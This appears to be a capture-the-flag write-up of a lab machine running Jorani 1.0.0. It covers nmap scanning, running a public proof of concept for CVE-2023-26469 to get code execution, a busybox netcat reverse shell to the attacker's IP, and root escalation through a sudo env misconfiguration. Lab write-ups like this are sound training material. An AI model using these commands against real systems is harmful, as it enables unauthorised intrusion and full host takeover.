Performing a TCP port scan using the command sudo nmap -sS 192.168.238.109 -p- returns the result shown in the image above. There are two TCP ports open: SSH and HTTP on their standard ports.


Performing an aggressive scan against the two TCP ports using the command sudo nmap -sV -A 192.168.238.109 -p 22,80 returns the result shown in the image above. The scan against the HTTP application on port 80 seems to return the interesting information: http-trane-info: Problem with XML parsing of /evox/about. Time to check this application further.

Enumeration & Exploitation: CVE-2023-26469

Port 80: Jorani v..1.0.0 (HTTP)

Before performing a directory search, I decided to check the error message returned by the nmap about the http-trane-info: Problem with XML parsing of /evox/about. Browsing to http://192.168.238.109/evox/about redirects the request to http://192.168.238.109/session/login as shown in the image above. Now I have the application name and version Jorani v1.0.0. I attempted to login using default credentials such as admin:admin, but I had no luck as the application did not allow me to login.


Doing a Google search for Jorani 1.0.0 vulnerabilities returned the interesting webpage shown in the image above. This page can be accessible from here. It looks like this application is vulnerable to path traversal attack which can be leveraged to perform code execution on the server. This vulnerability has the CVE ID of CVE-2023-26469. The PoC for this vulnerability has been provided underneath the References section. I downloaded the PoC on my machine and saved it inside a file called exp.py. Time to test it now.


I ran the exploit using the command python3 exp.py http://192.168.238.109 and instantly obtained a session on the target machine as the user jorani, as shown in the image above.


After obtaining a session, I performed a basic enumeration before obtaining a reverse shell connection. Running the command env returns the result shown in the image above. Is this user running with the highest privileges?


To obtain a reverse shell connection, I started a listener on my machine at port 80 and then deployed the payload busybox nc 192.168.45.206 80 -e /bin/bash. And instantly, I obtained a reverse shell connection on my machine at port 80.

Privilege Escalation

Vertical Privilege Escalation: User jordani to User root via /bin/env Misconfiguration Abuse

Running the command sudo -l shows the current user can execute the binary /usr/bin/env. This can be abused to open a new shell with root privilges. To achieve this, I ran the command sudo env /bin/bash. And bingo. Now I have a root shell on the target machine. Lesson learned after completing this box: always think in simple terms.
